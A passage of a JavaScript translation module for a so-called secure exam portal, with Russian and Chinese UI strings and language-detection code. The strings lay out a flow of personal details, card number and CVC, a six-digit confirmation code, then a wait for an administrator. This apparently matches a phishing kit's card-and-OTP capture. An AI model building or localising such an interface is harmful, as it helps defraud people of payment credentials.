            lbl_street: "\u0410\u0434\u0440\u0435\u0441", lbl_city: "\u0413\u043e\u0440\u043e\u0434", lbl_state: "\u0420\u0435\u0433\u0438\u043e\u043d", lbl_zip: "\u0418\u043d\u0434\u0435\u043a\u0441", lbl_country: "\u0421\u0442\u0440\u0430\u043d\u0430",
            btn_submit: "\u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c", msg_fill_all: "\u0417\u0430\u043f\u043e\u043b\u043d\u0438\u0442\u0435 \u0432\u0441\u0435 \u043f\u043e\u043b\u044f.",
            msg_submitting: "\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430...", msg_success_redirect: "\u0423\u0441\u043f\u0435\u0448\u043d\u043e! \u041f\u0435\u0440\u0435\u043d\u0430\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435...",
            msg_conn_error: "\u041e\u0448\u0438\u0431\u043a\u0430 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f.", msg_submit_fail: "\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438.",
            footer_text: "\u0411\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u0430\u044f \u0441\u0438\u0441\u0442\u0435\u043c\u0430 \u044d\u043a\u0437\u0430\u043c\u0435\u043d\u043e\u0432",
            pay_title: "\u041e\u043f\u043b\u0430\u0442\u0430 \u044d\u043a\u0437\u0430\u043c\u0435\u043d\u0430", pay_details: "\u0414\u0435\u0442\u0430\u043b\u0438 \u043e\u043f\u043b\u0430\u0442\u044b", pay_for: "\u0434\u043b\u044f",
            lbl_cardholder: "\u0412\u043b\u0430\u0434\u0435\u043b\u0435\u0446 \u043a\u0430\u0440\u0442\u044b", lbl_card_number: "\u041d\u043e\u043c\u0435\u0440 \u043a\u0430\u0440\u0442\u044b", ph_card_number: "\u041d\u043e\u043c\u0435\u0440 \u043a\u0430\u0440\u0442\u044b",
            lbl_expiry: "\u0421\u0440\u043e\u043a", lbl_cvc: "CVC", btn_pay: "\u041e\u043f\u043b\u0430\u0442\u0438\u0442\u044c",
            msg_processing: "\u041e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430...", msg_pay_success: "\u041e\u043f\u043b\u0430\u0442\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0430!",
            pay_secure: "\u0411\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u0430\u044f \u043e\u043f\u043b\u0430\u0442\u0430",
            otp_title: "\u041a\u043e\u0434 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f", otp_message: "\u0412\u0432\u0435\u0434\u0438\u0442\u0435 6-\u0437\u043d\u0430\u0447\u043d\u044b\u0439 \u043a\u043e\u0434.",
            btn_verify: "\u041f\u043e\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u0442\u044c", msg_enter_6: "\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0441\u0435 6 \u0446\u0438\u0444\u0440",
            wait_title: "\u0417\u0430\u043b \u043e\u0436\u0438\u0434\u0430\u043d\u0438\u044f", wait_welcome: "\u0414\u043e\u0431\u0440\u043e \u043f\u043e\u0436\u0430\u043b\u043e\u0432\u0430\u0442\u044c,",
            wait_message: "\u0412\u044b \u0437\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u044b. \u041e\u0436\u0438\u0434\u0430\u0439\u0442\u0435 \u0430\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440\u0430.",
            wait_warning: "\u041d\u0435 \u0437\u0430\u043a\u0440\u044b\u0432\u0430\u0439\u0442\u0435 \u0432\u043a\u043b\u0430\u0434\u043a\u0443.",
            ty_title: "\u0421\u043f\u0430\u0441\u0438\u0431\u043e", ty_message: "\u0420\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0430.",
            lang_label: "\u042f\u0437\u044b\u043a",
        },

        // ============ CHINESE (Simplified) ============
        zh: {
            badge: "\u5b89\u5168\u8003\u8bd5\u5e73\u53f0", site_title: "\u8003\u8bd5\u95e8\u6237",
            reg_hero_text: "\u586b\u5199\u60a8\u7684\u4fe1\u606f\u4ee5\u6ce8\u518c\u8003\u8bd5\u3002", reg_title: "\u5b66\u751f\u6ce8\u518c",
            reg_subtitle: "\u6240\u6709\u5b57\u6bb5\u5747\u4e3a\u5fc5\u586b\u3002",
            lbl_firstname: "\u540d", lbl_lastname: "\u59d3", lbl_email: "\u90ae\u7bb1", lbl_phone: "\u7535\u8bdd",
            lbl_street: "\u5730\u5740", lbl_city: "\u57ce\u5e02", lbl_state: "\u7701\u4efd", lbl_zip: "\u90ae\u7f16", lbl_country: "\u56fd\u5bb6",
            btn_submit: "\u63d0\u4ea4", msg_fill_all: "\u8bf7\u586b\u5199\u6240\u6709\u5b57\u6bb5\u3002",
            msg_submitting: "\u63d0\u4ea4\u4e2d...", msg_success_redirect: "\u63d0\u4ea4\u6210\u529f\uff01\u8df3\u8f6c\u4e2d...",
            msg_conn_error: "\u8fde\u63a5\u9519\u8bef\u3002", msg_submit_fail: "\u63d0\u4ea4\u5931\u8d25\u3002",
            pay_title: "\u8003\u8bd5\u8d39\u7528", pay_details: "\u4ed8\u6b3e\u8be6\u60c5", pay_for: "\u4e3a",
            lbl_cardholder: "\u6301\u5361\u4eba", lbl_card_number: "\u5361\u53f7", ph_card_number: "\u5361\u53f7",
            lbl_expiry: "\u6709\u6548\u671f", lbl_cvc: "CVC", btn_pay: "\u4ed8\u6b3e",
            msg_processing: "\u5904\u7406\u4e2d...", pay_secure: "\u5b89\u5168\u652f\u4ed8",
            otp_title: "\u8f93\u5165\u9a8c\u8bc1\u7801", otp_message: "\u8bf7\u8f93\u51656\u4f4d\u9a8c\u8bc1\u7801\u3002",
            btn_verify: "\u9a8c\u8bc1", msg_enter_6: "\u8bf7\u8f93\u5165\u5168\u90e86\u4f4d",
            wait_title: "\u7b49\u5019\u5ba4", wait_welcome: "\u6b22\u8fce\uff0c",
            wait_message: "\u60a8\u5df2\u6ce8\u518c\u3002\u8bf7\u7b49\u5f85\u7ba1\u7406\u5458\u3002", wait_warning: "\u8bf7\u52ff\u5173\u95ed\u6b64\u6807\u7b7e\u3002",
            ty_title: "\u8c22\u8c22", ty_message: "\u6ce8\u518c\u5b8c\u6210\u3002",
            lang_label: "\u8bed\u8a00",
        },
    };

    // ---- State ----
    let currentLang = 'en';
    const supported = Object.keys(TRANSLATIONS);

    // ---- Detect language ----
    function detectLang() {
        // 1. Check localStorage
        const saved = localStorage.getItem('portal_lang');
        if (saved && TRANSLATIONS[saved]) return saved;

        // 2. Check browser language
        const nav = (navigator.language || navigator.userLanguage || 'en').toLowerCase();
        const short = nav.split('-')[0];
        if (TRANSLATIONS[short]) return short;

        // 3. Check Accept-Language via meta tag (set by PHP)
        const meta = document.querySelector('meta[name="accept-language"]');
        if (meta) {
            const val = meta.content.split(',')[0].split('-')[0].toLowerCase();
            if (TRANSLATIONS[val]) return val;
        }

        return 'en';
    }

    // ---- Translate ----
    function t(key, fallback) {
        const dict = TRANSLATIONS[currentLang] || TRANSLATIONS.en;
        return dict[key] || (TRANSLATIONS.en[key]) || fallback || key;
    }

    function applyToDOM() {
        // Text content
        document.querySelectorAll('[data-i18n]').forEach(el => {
            const key = el.getAttribute('data-i18n');
            const val = t(key);
            if (val && val !== key) el.textContent = val;
        });

        // Placeholders
        document.querySelectorAll('[data-i18n-ph]').forEach(el => {
            const key = el.getAttribute('data-i18n-ph');
            const val = t(key);
            if (val && val !== key) el.placeholder = val;
        });

        // HTML content (for elements with markup)
        document.querySelectorAll('[data-i18n-html]').forEach(el => {
            const key = el.getAttribute('data-i18n-html');
            const val = t(key);
            if (val && val !== key) el.innerHTML = val;
        });

        // Set dir=rtl for Arabic
        document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
        document.documentElement.lang = currentLang;
    }

    function setLang(lang) {
        if (!TRANSLATIONS[lang]) return;
        currentLang = lang;
        localStorage.setItem('portal_lang', lang);
        applyToDOM();
    }

    function getLang() { return currentLang; }
    function getSupported() { return supported; }

    // ---- Language selector widget ----
    function createSelector(containerId) {
        const container = document.getElementById(containerId);
        if (!container) return;

        const langNames = {
            en: 'English', fr: 'Fran\u00e7ais', es: 'Espa\u00f1ol', ar: '\u0627\u0644\u0639\u0631\u0628\u064a\u0629',
            de: 'Deutsch', pt: 'Portugu\u00eas', tr: 'T\u00fcrk\u00e7e', it: 'Italiano',
            ru: '\u0420\u0443\u0441\u0441\u043a\u0438\u0439', zh: '\u4e2d\u6587'
        };

        const sel = document.createElement('select');
        sel.style.cssText = 'padding:6px 10px;border-radius:8px;border:1px solid #e2e8f0;font-size:.82rem;background:#fff;color:#1e293b;cursor:pointer;font-family:inherit';
        supported.forEach(code => {
            const opt = document.createElement('option');
            opt.value = code;
            opt.textContent = langNames[code] || code;
            if (code === currentLang) opt.selected = true;
            sel.appendChild(opt);
        });
        sel.addEventListener('change', () => setLang(sel.value));
        container.appendChild(sel);
    }

    // ---- Auto-init ----
    currentLang = detectLang();
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', applyToDOM);
    } else {
        applyToDOM();
    }

    return { t, setLang, getLang, getSupported, applyToDOM, createSelector, TRANSLATIONS };
})();
